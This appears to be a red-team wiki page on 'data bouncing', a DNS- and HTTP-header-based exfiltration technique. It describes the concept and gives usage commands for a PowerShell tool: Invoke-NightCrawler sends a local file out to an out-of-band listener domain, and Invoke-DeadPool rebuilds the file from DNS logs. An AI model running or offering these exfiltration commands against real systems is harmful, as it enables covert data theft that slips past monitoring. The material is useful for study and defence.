# Data Bouncing - External Data Exfiltration

## Introduction

**Data bouncing** is a sophisticated **data exfiltration technique** where an attacker **routes stolen data through multiple intermediary systems** before reaching the final destination. This method makes it difficult to trace the data's origin, detect unauthorized transfers, and prevent forensic investigations.

## How It Works

* **Compromise an Internal System**
  * The attacker gains access to a target system via phishing, malware, or exploiting a vulnerability.
* **Identify External Intermediary Systems (Bouncing Points)**
  * These are typically compromised servers, cloud services, or even **legitimate third-party services** (like file-sharing platforms, webhooks, or messaging APIs).
  * Common bouncing points:
    * **Compromised cloud storage (Google Drive, Dropbox, AWS S3)**
    * **Public forums, blogs, or Pastebin**
    * **Compromised IoT devices or routers**
    * **Decentralized networks (Tor, I2P, blockchain transactions)**
* **Exfiltrate Data Through Multiple Hops**
  * Instead of sending data directly to the attacker's machine, it is **first stored or relayed through one or more bouncing points**.
  * Example techniques:
    * Encrypt and upload the data to **Google Drive**, then download it from a different location.
    * Encode data in **DNS queries or HTTP requests** routed via a proxy.
    * Use **social media posts, QR codes, or image steganography** to hide data.
* **Retrieve Data Without Raising Alarms**
  * The attacker retrieves the data from the bouncing point **at a later time**, making it difficult to detect real-time exfiltration.

## Why Attackers Use This?

* **Avoid Detection:**
  * Direct data transfers to suspicious IPs trigger security alerts.
  * Bouncing makes it look like normal traffic.
* **Bypass Security Controls:**
  * Firewalls and DLP (Data Loss Prevention) tools may allow uploads to trusted cloud services.
* **Anonymity & Attribution Confusion:**
  * Investigators may track the exfiltrated data only to an **intermediate system**, not the attacker's true identity.



***

## Practical

### Tools

* [https://github.com/Unit-259/DataBouncing](https://github.com/Unit-259/DataBouncing)

{% hint style="success" %}
Data Bouncing is a technique for transmitting data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version packs all the core functionality of data bouncing into a simple tool for reconnaissance, data exfiltration, and file reassembly. It's built on the original, off-the-wall ideas of our hacker pals, John and Dave. Their wild, creative approach to data bouncing sparked everything we've built, and we're forever grateful. If you're curious, check out their work over at [thecontractor.io](https://thecontractor.io/data-bouncing/). Huge props to them for always pushing the envelope and keeping the hacker spirit alive!
{% endhint %}

The project comes with two main scripts:

* **`nightCrawler.ps1`**: Handles data exfiltration.
* **`deadPool.ps1`**: Reassembles the exfiltrated data from DNS logs.

### Data Exfiltration - nightCrawler.ps1

{% hint style="success" %}
Provide the URLs for your OOB listener as a comma-separated list (e.g., adobe.com, github.com).

Specify the file path of the data you wish to exfiltrate.
{% endhint %}

```
Invoke-NightCrawler -Identifier "testid" -Domain "cv8erb8gdmbc73c0ns00o1dra4c8ibd4r.oast.fun" -Urls "adobe.com","github.com" -FilePath "C:\Path\to\file.txt" -EncryptionEnabled -EncryptionKey "YourSecretKey"
```

### Data Reconstruction - deadPool.ps1

{% hint style="success" %}
Run this script on your own computer where the DNS logs are stored. It extracts the hex-encoded chunks (with sequence numbers), sorts them, decodes them, and reconstructs the original file. Example command:
{% endhint %}

```
Invoke-DeadPool -LogFile "C:\Path\to\logs.txt" -Identifier "testid" -EncryptionEnabled -EncryptionKey "YourSecretKey" -OutputFile "C:\Path\to\ReconstructedFile.txt"
```

***

## REFERENCES

* [https://www.youtube.com/watch?v=oMmB7mi7KRk\&list=WL\&index=1\&ab\_channel=TheWeeklyPurpleTeam](https://www.youtube.com/watch?v=oMmB7mi7KRk\&list=WL\&index=1\&ab_channel=TheWeeklyPurpleTeam)
* [https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)
* [https://github.com/Unit-259/DataBouncing](https://github.com/Unit-259/DataBouncing)

